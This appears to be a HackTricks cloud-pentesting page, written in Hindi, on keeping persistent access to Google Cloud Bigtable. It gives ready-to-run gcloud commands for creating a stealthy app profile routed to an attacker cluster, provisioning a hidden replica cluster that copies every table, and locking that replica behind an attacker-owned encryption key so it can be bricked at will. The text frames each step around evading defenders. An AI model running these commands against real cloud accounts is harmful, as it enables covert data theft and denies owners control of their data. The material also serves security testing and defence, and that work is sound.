# GCP - Bigtable Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Bigtable के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### Dedicated attacker App Profile

**अनुमतियाँ:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

ऐसा एक app profile बनाएं जो ट्रैफ़िक को आपकी replica cluster की ओर रूट करे और Data Boost सक्षम करें ताकि आप उन provisioned nodes पर कभी निर्भर न रहें जिन्हें defenders नोटिस कर सकते हैं।

<details>

<summary>Create stealth app profile</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

जब तक यह प्रोफ़ाइल मौजूद है, आप इसे संदर्भित करने वाले नए क्रेडेंशियल्स का उपयोग करके पुनः कनेक्ट कर सकते हैं।

### अपना स्वयं का रिप्लिका क्लस्टर बनाए रखें

**अनुमतियाँ:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

एक शांत क्षेत्र में न्यूनतम node-count क्लस्टर प्रोविजन करें। भले ही आपकी क्लाइंट पहचानें गायब हो जाएँ, **क्लस्टर प्रत्येक टेबल की पूरी कॉपी रखता है** जब तक रक्षकों द्वारा इसे स्पष्ट रूप से न हटाया जाए।

<details>

<summary>रिप्लिका क्लस्टर बनाएँ</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
</details>

इस पर नज़र रखें `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` के माध्यम से ताकि आप डेटा खींचने की आवश्यकता होने पर तुरंत स्केल कर सकें।

### अपनी खुद की CMEK के पीछे replication को लॉक करें

**अनुमतियाँ:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` attacker-owned key पर।

क्लोन बनाते समय अपना KMS key लाएँ। उस key के बिना, Google क्लस्टर को re-create या fail over नहीं कर सकता, इसलिए blue teams को उससे छेड़छाड़ करने से पहले आपके साथ समन्वय करना होगा।

<details>

<summary>CMEK-प्रोटेक्टेड cluster बनाएं</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

अपने प्रोजेक्ट में कुंजी को रोटेट करें या निष्क्रिय कर दें ताकि आप तुरंत replica को brick कर सकें (फिर भी बाद में उसे वापस चालू करने की अनुमति देते हुए)।

{{#include ../../../banners/hacktricks-training.md}}
